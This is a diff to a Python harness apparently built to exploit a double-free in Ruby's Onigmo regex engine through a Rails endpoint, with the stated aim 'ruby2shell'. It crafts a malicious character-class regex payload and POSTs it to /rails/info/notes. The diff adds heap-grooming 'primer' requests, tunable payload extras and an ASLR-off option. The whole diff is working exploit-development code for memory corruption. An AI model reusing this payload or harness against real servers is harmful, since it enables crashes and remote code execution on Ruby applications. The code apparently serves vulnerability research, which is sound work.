@@ -38,11 +38,12 @@ def no_core() -> None:
     resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
 
 
-def malicious_tag() -> str:
+def malicious_tag(nested_extras: int = 0) -> str:
     # 9,999 disjoint two-codepoint ranges cross ONIG_MAX_MULTI_BYTE_RANGES_NUM
     # only on the second && intersection, after cc->mbuf was freed once.
     chars = "".join(chr(0x4E00 + 2 * i) for i in range(9_999))
-    return "(?i:[[:^ascii:][^" + chars + "]&&[^\\u9fff]&&x])"
+    extra = "".join(f"\\u{{{0xA000 + i * 0x100:X}}}" for i in range(nested_extras))
+    return "(?i:[[:^ascii:][^" + chars + "]&&[^\\u9fff" + extra + "]&&x])"
 
 
 def wait_ready(proc: subprocess.Popen, port: int) -> bool:
@@ -100,11 +101,17 @@ def main() -> int:
     result_path = EV / f"{tag}.json"
     response_path = EV / f"{tag}.response"
     maps_path = EV / f"{tag}.maps"
+    pid_path = EV / f"{tag}.pid"
     arm_path = EV / f"{tag}.arm"
-    pattern = "TODO" if mode == "safe" else malicious_tag()
+    nested_extras = int(os.environ.get("RUBY2SHELL_REGEXP_NESTED_EXTRAS", "0"))
+    pattern = "TODO" if mode == "safe" else malicious_tag(nested_extras)
     names = int(os.environ.get("RUBY2SHELL_REGEXP_NAMES", "0"))
     name_len = int(os.environ.get("RUBY2SHELL_REGEXP_NAME_LEN", "15"))
     safe_prefix = int(os.environ.get("RUBY2SHELL_REGEXP_SAFE_PREFIX", "0"))
+    primer_k = int(os.environ.get("RUBY2SHELL_REGEXP_PRIMER_K", "0"))
+    primer = os.environ.get("RUBY2SHELL_REGEXP_PRIMER", "")
+    if primer_k:
+        primer = "|".join(["[[:^ascii:][^一]&&x]"] * primer_k)
     if names:
         if not 6 <= name_len <= 19:
             raise SystemExit("RUBY2SHELL_REGEXP_NAME_LEN must be 6..19")
@@ -122,8 +129,9 @@ def main() -> int:
         env["REGTRACE_FD"] = "2"
         env["REGTRACE_ARM"] = str(arm_path)
     body = urlencode({"_method": "GET", "tag": pattern}).encode()
+    primer_body = urlencode({"_method": "GET", "tag": primer}).encode() if primer else b""
 
-    command = [str(ruby), str(APP / "bin/rails"), "server", "-b", "127.0.0.1", "-p", str(port)]
+    command = [str(ruby), str(APP / "bin/rails"), "server", "-b", "127.0.0.1", "-p", str(port), "--pid", str(pid_path)]
     if os.environ.get("RUBY2SHELL_REGEXP_ASLR_OFF"):
         command = ["setarch", platform.machine(), "-R"] + command
     with log_path.open("wb") as log:
@@ -143,6 +151,9 @@ def main() -> int:
             "names": names,
             "name_len": name_len,
             "safe_prefix": safe_prefix,
+            "nested_extras": nested_extras,
+            "primer_k": primer_k,
+            "primer_bytes": len(primer.encode()),
             "trace": trace,
             "tcache0": bool(os.environ.get("RUBY2SHELL_REGEXP_TCACHE0")),
             "aslr_off": bool(os.environ.get("RUBY2SHELL_REGEXP_ASLR_OFF")),
@@ -160,7 +171,21 @@ def main() -> int:
                 if trace:
                     arm_path.touch()
                 try:
-                    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=90)
+                    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=float(os.environ.get("RUBY2SHELL_REGEXP_TIMEOUT", "90")))
+                    if primer:
+                        conn.request(
+                            "POST",
+                            "/rails/info/notes",
+                            body=primer_body,
+                            headers={
+                                "Content-Type": "application/x-www-form-urlencoded",
+                                "Content-Length": str(len(primer_body)),
+                            },
+                        )
+                        primer_response = conn.getresponse()
+                        primer_data = primer_response.read()
+                        result["primer_http_status"] = primer_response.status
+                        result["primer_response_bytes"] = len(primer_data)
                     conn.request(
                         "POST",
                         "/rails/info/notes",
@@ -190,7 +215,7 @@ def main() -> int:
                 except subprocess.TimeoutExpired:
                     proc.kill()
                     proc.wait()
-
+            pid_path.unlink(missing_ok=True)
     server_log = log_path.read_text(errors="replace")
     result["server_log_tail"] = server_log[-2_000:]
     if mode == "calibrate":
